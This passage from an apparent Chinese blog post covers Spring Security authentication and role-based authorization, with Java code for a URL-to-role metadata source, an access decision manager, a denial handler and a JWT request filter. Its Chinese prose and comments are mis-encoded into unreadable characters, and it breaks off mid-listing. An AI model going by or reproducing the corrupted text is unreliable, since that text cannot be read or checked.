‹ä¸­å‡éœ€è¦è‡ªå®šä¹‰ä¸€ä¸ªç±»æ¥é‡æ–°å®ç°æˆ–è€…å˜æ›´ä¸ºSpringä¸­å…¶ä»–å®ç°ç±»ã€‚</p></blockquote><p>æ¦‚å¿µé€ŸæŸ¥ï¼š</p><ul><li><strong><code>Authentication</code><strong>æ¥å£: å®ƒçš„å®ç°ç±»ï¼Œè¡¨ç¤ºå½“å‰è®¿é—®ç³»ç»Ÿçš„ç”¨æˆ·ï¼Œ</strong>å°è£…äº†ç”¨æˆ·çš„æƒé™ç­‰ç›¸å…³ä¿¡æ¯ã€‚</strong></li><li><strong><code>AuthenticationManager</code><strong>æ¥å£ï¼šå®šä¹‰äº†è®¤è¯Authenticationçš„æ–¹æ³• ,å®ç°ç±»æ˜¯</strong><code>ProviderManager</code></strong><ul><li>å®ƒçš„å®ç°ç±»æ˜¯**<code>ProviderManager</code><strong>ï¼Œå®ƒçš„åŠŸèƒ½ä¸»è¦æ˜¯å®ç°</strong>è®¤è¯ç”¨æˆ·<strong>ï¼Œå› ä¸ºåœ¨å†™ç™»å½•æ¥å£æ—¶ï¼Œå¯ä»¥é€šè¿‡é…ç½®ç±»çš„æ–¹å¼ï¼Œæ³¨å…¥Springå®¹å™¨ä¸­æ¥ä½¿ç”¨å®ƒçš„</strong><code>authenticate</code>æ–¹æ³•**ã€‚</li></ul></li><li><strong><code>UserDetailsService</code><strong>æ¥å£ï¼šåŠ è½½ç”¨æˆ·ç‰¹å®šæ•°æ®çš„æ ¸å¿ƒæ¥å£ã€‚é‡Œé¢å®šä¹‰äº†ä¸€ä¸ª</strong>æ ¹æ®ç”¨æˆ·åæŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯çš„æ–¹æ³•</strong>ã€‚<ul><li>åŸæœ¬çš„å®ç°ç±»æ˜¯**<code>InMemoryUserDetailsManager</code>**ï¼Œå®ƒæ˜¯åœ¨å†…å­˜ä¸­æŸ¥è¯¢ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦è‡ªå®šä¹‰æ”¹æ¥å£ã€‚</li></ul></li><li>**<code>UserDetails</code><strong>æ¥å£ï¼šæä¾›æ ¸å¿ƒç”¨æˆ·ä¿¡æ¯ã€‚é€šè¿‡</strong><code>UserDetailsService</code><strong>æ ¹æ®ç”¨æˆ·åè·å–å¤„ç†çš„ç”¨æˆ·ä¿¡æ¯è¦å°è£…æˆ</strong><code>UserDetails</code><strong>å¯¹è±¡è¿”å›ã€‚ç„¶åå°†è¿™äº›ä¿¡æ¯å°è£…åˆ°</strong><code>Authentication</code>**å¯¹è±¡ä¸­ã€‚<ul><li>å½“æˆ‘ä»¬è‡ªå®šä¹‰**<code>UserDetailsService</code><strong>æ¥å£æ—¶ï¼Œéœ€è¦æˆ‘ä»¬å®šä¹‰ä¸€ä¸ª</strong>å®ä½“ç±»<strong>æ¥å®ç°è¿™ä¸ªæ¥å£æ¥ä¾›</strong><code>UserDetailsService</code>**æ¥å£è¿”å›ã€‚ã€æ³¨æ„æ˜¯å®ä½“ç±»ã€‘</li></ul></li></ul><h3><span id="åŸºäºcookieä¸sessionçš„æ–¹æ¡ˆ">åŸºäºCookieä¸Sessionçš„æ–¹æ¡ˆ</span></h3><ul><li>ä¼˜ç‚¹ï¼šå®ç°ç®€å•ï¼Œæˆç†Ÿ</li><li>ç¼ºç‚¹ï¼šé›†ç¾¤æƒ…å†µä¸‹å®ç°å›°éš¾ï¼Œåå‘ä»£ç†é…ç½®ç¹çï¼Œç§»åŠ¨ç«¯ä¸å‹å¥½</li></ul><h3><span id="åŸºäºjwtçš„æ–¹æ¡ˆ">åŸºäºjwtçš„æ–¹æ¡ˆ</span></h3><ul><li>ä¼˜ç‚¹ï¼šæ— çŠ¶æ€ï¼ŒæœåŠ¡å™¨èµ„æºå ç”¨å°ï¼Œå¤©ç”Ÿæ”¯æŒåˆ†å¸ƒå¼ï¼Œå®ç°ç®€å•</li><li>ç¼ºç‚¹ï¼šå®‰å…¨æ€§ä¸é«˜ï¼Œjwtæ²¡åŠæ³•å®ç°è¿‡æœŸå°†ç”¨æˆ·è¸¢ä¸‹çº¿ï¼Œåªèƒ½å‰ç«¯å®ç°ï¼Œä½†æ˜¯jwtåœ¨æœ‰æ•ˆæœŸå†…ä¾ç„¶æœ‰æ•ˆã€‚</li></ul><h3><span id="åŸºäºè‡ªå®šä¹‰tokenredis">åŸºäºè‡ªå®šä¹‰Token+Redis</span></h3><ul><li>ä¼˜ç‚¹ï¼šæœåŠ¡å™¨å¯ä»¥å®ç°å¯¹ç”¨æˆ·çš„ä¸‹çº¿ç­‰æ“ä½œï¼Œæ”¯æŒåˆ†å¸ƒå¼</li><li>ç¼ºç‚¹ï¼šç›¸æ¯”jwtæ˜¯ä¸­å¿ƒåŒ–æ–¹æ¡ˆï¼Œå¯¹æœåŠ¡å™¨å­˜å‚¨æœ‰è¦æ±‚ï¼Œåˆ†å¸ƒå¼éœ€è¦ç”¨åˆ°Redis</li></ul><h3><span id="æŠ€æœ¯è·¯çº¿">æŠ€æœ¯è·¯çº¿</span></h3><ul><li>å¯ä»¥ä½¿ç”¨controllerï¼Œç„¶åä¸ä½¿ç”¨formloginå°±ä¸ä¼šæ³¨å…¥UserPasswordAuthenticationFilterï¼ˆæ¯”è¾ƒçµæ´»ï¼Œå®ç°æ‹“å±•åŠŸèƒ½æ¯”è¾ƒç®€å•ï¼‰</li><li>ä¹Ÿå¯ä»¥é‡å†™UserPasswordAuthenticationFilterï¼Œç„¶åé‡å†™å®ƒçš„è®¤è¯æˆåŠŸï¼Œå¤±è´¥æ¥å£</li></ul><h2><span id="é‰´æƒ">é‰´æƒ</span></h2><p>é‰´æƒå‘ç”Ÿåœ¨è®¤è¯ä¹‹åï¼Œå› æ­¤é‰´æƒå…¥å£åœ¨<strong>FilterSecurityInterceptor</strong>ä¸­ï¼Œ<a href="https://juejin.cn/post/6847902222668431368">åŸç†</a>ä¸å¤šèµ˜è¿°ï¼Œæœ‰ä¸‰ç§å®ç°æ–¹æ³•ã€‚</p><ol><li>ç›´æ¥é‡å†™ä¸€ä¸ª<code>AccessDecisionManager</code>ï¼Œå°†å®ƒç”¨ä½œé»˜è®¤çš„<code>AccessDecisionManager</code>ï¼Œå¹¶åœ¨é‡Œé¢ç›´æ¥å†™å¥½é‰´æƒé€»è¾‘ã€‚</li><li>å†æ¯”å¦‚é‡å†™ä¸€ä¸ªæŠ•ç¥¨å™¨ï¼Œå°†å®ƒæ”¾åˆ°é»˜è®¤çš„<code>AccessDecisionManager</code>é‡Œé¢ï¼Œå’Œä¹‹å‰ä¸€æ ·ç”¨æŠ•ç¥¨å™¨é‰´æƒã€‚</li><li>æˆ‘çœ‹ç½‘ä¸Šè¿˜æœ‰äº›åšå®¢ç›´æ¥å»åš<code>FilterSecurityInterceptor</code>çš„æ”¹åŠ¨ã€‚</li></ol><h3><span id="ç”¨æˆ·æƒé™">ç”¨æˆ·æƒé™</span></h3><blockquote><p>UserUserDetails ç”¨æˆ·æƒé™</p><p>GrantedAuthority ä¸€èˆ¬ä½¿ç”¨å®ç°ç±»SimpleGrantedAuthorityå°±å¤Ÿäº†</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å½“æ›´æ–°Adminæ—¶ï¼Œä¼ å…¥çš„authoritiesæ˜¯JSONæ ¼å¼ï¼Œè€ŒgetAuthorities()</span></span><br><span class="line"><span class="comment"> * éœ€è¦Collection&lt;? extends GrantedAuthority&gt; æ ¼å¼</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * è‡ªå®šä¹‰JSONååºåˆ—åŒ–</span></span><br><span class="line"><span class="comment"> * CustomAuthorityDeserializer</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@JsonDeserialize(using = CustomAuthorityDeserializer.class)</span></span><br><span class="line"><span class="keyword">public</span> Collection&lt;? <span class="keyword">extends</span> <span class="title class_">GrantedAuthority</span>&gt; getAuthorities() &#123;</span><br><span class="line">    List&lt;SimpleGrantedAuthority&gt; authorities = roles</span><br><span class="line">            .stream()</span><br><span class="line">            .map(role -&gt; <span class="keyword">new</span> <span class="title class_">SimpleGrantedAuthority</span>(role.getName()))</span><br><span class="line">            .collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> authorities;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="é‰´æƒè§„åˆ™æº">é‰´æƒè§„åˆ™æº</span></h3><blockquote><p>FilterInvocationSecurityMetadataSource é‰´æƒè§„åˆ™æº</p><p>ç”¨äºè¿”å›å½“å‰APIæ‰€éœ€çš„ROLE</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * èœå•æƒé™æ§åˆ¶</span></span><br><span class="line"><span class="comment"> * æ ¹æ®è¯·æ±‚urlåˆ†æè¯·æ±‚æ‰€éœ€çš„è§’è‰²</span></span><br><span class="line"><span class="comment"> * è®¿é—®è¯¥urlèµ„æºæ‰€éœ€è§’è‰²</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomFilter</span> <span class="keyword">implements</span> <span class="title class_">FilterInvocationSecurityMetadataSource</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> IMenuService menuService;</span><br><span class="line"></span><br><span class="line">    <span class="type">AntPathMatcher</span> <span class="variable">antPathMatcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AntPathMatcher</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ ¹æ®requestè¯·æ±‚è·å–è®¿é—®èµ„æºæ‰€éœ€æƒé™</span></span><br><span class="line"><span class="comment">     * ç”¨æˆ·GrantedAuthorityä¸ConfigAttributeä¸€å¯¹æ¯”å°±çŸ¥é“ç”¨æˆ·æœ‰æ²¡æœ‰æƒé™è®¿é—®è¯¥apiäº†</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> o</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;ConfigAttribute&gt; <span class="title function_">getAttributes</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">        <span class="comment">//è·å–è¯·æ±‚çš„url</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">requestUrl</span> <span class="operator">=</span> ((FilterInvocation) o).getRequestUrl();</span><br><span class="line">        List&lt;Menu&gt; menus = menuService.getMenusWithRole();</span><br><span class="line">        <span class="keyword">for</span> (Menu menu : menus) &#123;</span><br><span class="line">            <span class="comment">//åˆ¤æ–­è¯·æ±‚urlä¸èœå•è§’è‰²æ˜¯å¦åŒ¹é…</span></span><br><span class="line">            <span class="keyword">if</span> (antPathMatcher.match(menu.getUrl(),requestUrl)) &#123;</span><br><span class="line">                <span class="comment">//å¾—åˆ°rnameï¼Œå¹¶å°†å…¶æ”¾å…¥ä¸€ä¸ªstringé›†åˆä¸­,ä¸€ä¸ªurlå¯èƒ½å¯¹åº”å¤šä¸ªè§’è‰²</span></span><br><span class="line">                String[] str = menu.getRoles().stream().map(Role::getName).toArray(String[]::<span class="keyword">new</span>);</span><br><span class="line">                <span class="comment">//å°†å¾—åˆ°çš„è§’è‰²æ”¾å…¥Listé‡Œ</span></span><br><span class="line">                <span class="keyword">return</span> SecurityConfig.createList(str);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//ç»™ä¸€ä¸ªé»˜è®¤ç™»å½•å³å¯è®¿é—®è§’è‰²</span></span><br><span class="line">        <span class="keyword">return</span> SecurityConfig.createList(<span class="string">&quot;ROLE_LOGIN&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;ConfigAttribute&gt; <span class="title function_">getAllConfigAttributes</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">supports</span><span class="params">(Class&lt;?&gt; aClass)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="æˆæƒç®¡ç†">æˆæƒç®¡ç†</span></h3><blockquote><p>AccessDecisionManager</p><p>ç”¨æˆ·GrantedAuthorityä¸ConfigAttributeä¸€å¯¹æ¯”å°±çŸ¥é“ç”¨æˆ·æœ‰æ²¡æœ‰æƒé™è®¿é—®è¯¥apiäº†</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Authentication authentication</span></span><br><span class="line"><span class="comment"> * è®¤è¯ä¹‹åçš„èº«ä»½</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Object o</span></span><br><span class="line"><span class="comment"> * Objectå¯¹è±¡è¿™é‡Œæ˜¯è¦è®¿é—®çš„å—ä¿æŠ¤èµ„æºï¼Œä»–æ˜¯ä¸€ä¸ªFilterInvocationç±»å‹,ä½ å¯ä»¥é€šè¿‡è¿™ä¸ªå¯¹è±¡è·å–å½“å‰æ‰€è®¿é—®çš„è·¯å¾„</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Collection&lt;ConfigAttribute&gt; configAttributes</span></span><br><span class="line"><span class="comment"> * Collectioné›†åˆå°±æ˜¯è¦æ“ä½œå½“å‰èµ„æºï¼Œæ‰€éœ€è¦çš„è§’è‰²ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/weixin_43836204/article/details/106310730</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">decide</span><span class="params">(Authentication authentication, Object o, Collection&lt;ConfigAttribute&gt; configAttributes)</span> <span class="keyword">throws</span> AccessDeniedException, InsufficientAuthenticationException &#123;</span><br><span class="line">    <span class="keyword">for</span> (ConfigAttribute attribute : configAttributes) &#123;</span><br><span class="line">        <span class="comment">//å½“å‰urlèµ„æºæ‰€éœ€è§’è‰²</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">needRole</span> <span class="operator">=</span> attribute.getAttribute();</span><br><span class="line">        <span class="comment">//åˆ¤æ–­ç”¨æˆ·è§’è‰²æ˜¯å¦ä¸ºurlæ‰€éœ€è§’è‰²</span></span><br><span class="line">        Collection&lt;? <span class="keyword">extends</span> <span class="title class_">GrantedAuthority</span>&gt; authorities = authentication.getAuthorities();</span><br><span class="line">        <span class="keyword">for</span> (GrantedAuthority authority : authorities) &#123;</span><br><span class="line">            <span class="keyword">if</span> (authority.getAuthority().equals(needRole)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//åˆ¤æ–­è§’è‰²æ˜¯å¦æ˜¯ç™»å½•å³å¯è®¿é—®çš„è§’è‰²ï¼Œæ­¤è§’è‰²åœ¨CustomFilterä¸­è®¾ç½®</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;ROLE_LOGIN&quot;</span>.equals(needRole)) &#123;</span><br><span class="line">            <span class="comment">//åˆ¤æ–­æ˜¯å¦ç™»å½•</span></span><br><span class="line">            <span class="keyword">if</span> (authentication <span class="keyword">instanceof</span> AnonymousAuthenticationToken) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AccessDeniedException</span>(<span class="string">&quot;å°šæœªç™»å½•ï¼Œè¯·ç™»å½•&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AccessDeniedException</span>(<span class="string">&quot;æƒé™ä¸è¶³ï¼Œè¯·è”ç³»ç®¡ç†å‘˜&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="æˆæƒé”™è¯¯å¤„ç†å™¨">æˆæƒé”™è¯¯å¤„ç†å™¨</span></h3><blockquote><p>AccessDeniedHandler</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: cowork-back</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: å½“è®¿é—®æ¥å£æ²¡æƒé™æ—¶ï¼Œè‡ªå®šä¹‰è¿”å›ç»“æœ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: disda</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2022-01-24 15:35</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestfulAccessDeniedHandler</span> <span class="keyword">implements</span> <span class="title class_">AccessDeniedHandler</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, AccessDeniedException e)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        httpServletResponse.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        httpServletResponse.setContentType(<span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> httpServletResponse.getWriter();</span><br><span class="line">        <span class="type">RespBean</span> <span class="variable">bean</span> <span class="operator">=</span> RespBean.error(<span class="string">&quot;æƒé™ä¸è¶³ï¼Œè¯·è”ç³»ç®¡ç†å‘˜ï¼&quot;</span>);</span><br><span class="line">        bean.setCode(<span class="number">403</span>);</span><br><span class="line">        out.write(<span class="keyword">new</span> <span class="title class_">ObjectMapper</span>().writeValueAsString(bean));</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="é…ç½®æˆæƒè¿‡æ»¤å™¨">é…ç½®æˆæƒè¿‡æ»¤å™¨</span></h3><blockquote><p>OncePerRequestFilter</p></blockquote><ul><li>jwtç‰ˆæœ¬</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.disda.cowork.config.security.components;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.authentication.UsernamePasswordAuthenticationToken;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.context.SecurityContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetails;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetailsService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.authentication.WebAuthenticationDetailsSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.filter.OncePerRequestFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: cowork-back</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: jwt ç™»å½•æˆæƒè¿‡æ»¤å™¨</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: disda</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2022-01-24 14:52</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtAuthenticationTokenFilter</span> <span class="keyword">extends</span> <span class="title class_">OncePerRequestFilter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jwt.tokenHeader&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String tokenHeader;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jwt.tokenHead&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String tokenHead;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JwtTokenUtil jwtTokenUtil;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserDetailsService userDetailsService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * æµè§ˆå™¨ä¼ è¿‡æ¥çš„requestè¯·æ±‚ä¸­</span></span><br><span class="line"><span class="comment">         * key value</span></span><br><span class="line"><span class="comment">         * keyä¸ºé…ç½®ä¸­çš„tokenHeader</span></span><br><span class="line"><span class="comment">         * valueä¸ºé…ç½®ä¸­çš„tokenHead+ç©ºæ ¼+token</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">authHeader</span> <span class="operator">=</span> request.getHeader(tokenHeader);</span><br><span class="line">        <span class="comment">// å­˜åœ¨token</span></span><br><span class="line">        <span class="keyword">if</span>(authHeader!=<span class="literal">null</span>&amp;&amp;authHeader.startsWith(tokenHead))&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">authToken</span> <span class="operator">=</span> authHeader.substring(tokenHead.length());</span><br><span class="line">            <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> jwtTokenUtil.getUserNameFromToken(authToken);</span><br><span class="line">            <span class="comment">// tokenå­˜åœ¨ç”¨æˆ·åï¼Œä½†æ˜¯æœªç™»å½•</span></span><br><span class="line">            <span class="keyword">if</span>(username!=<span class="literal">null</span> &amp;&amp; SecurityContextHolder.getContext().getAuthentication() == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="comment">// ç™»å½•</span></span><br><span class="line">                <span class="type">UserDetails</span> <span class="variable">userDetails</span> <span class="operator">=</span> userDetailsService.loadUserByUsername(username);</span><br><span class="line">                <span class="comment">// éªŒè¯Tokenæ˜¯å¦æœ‰æ•ˆï¼Œé‡æ–°è®¾ç½®ç”¨æˆ·å¯¹è±¡</span></span><br><span class="line">                <span class="keyword">if</span>(jwtTokenUtil.validateToken(authToken,userDetails))&#123;</span><br><span class="line">                    <span class="type">UsernamePasswordAuthenticationToken</span> <span class="variable">authenticationToken</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsernamePasswordAuthenticationToken</span>(userDetails,<span class="literal">null</span>,userDetails.getAuthorities());</span><br><span class="line">                    authenticationToken.setDetails(<span class="keyword">new</span> <span class="title class_">WebAuthenticationDetailsSource</span>().buildDetails(request));</span><br><span class="line">                    SecurityContextHolder.getContext().setAuthentication(authenticationToken);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="é…ç½®spring-security">é…ç½®Spring Security</span></h3><blockquote><p>SecurityConfig extends WebSecurityConfigurerAdapter</p></blockquote><ul><li>jwtç‰ˆæœ¬</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 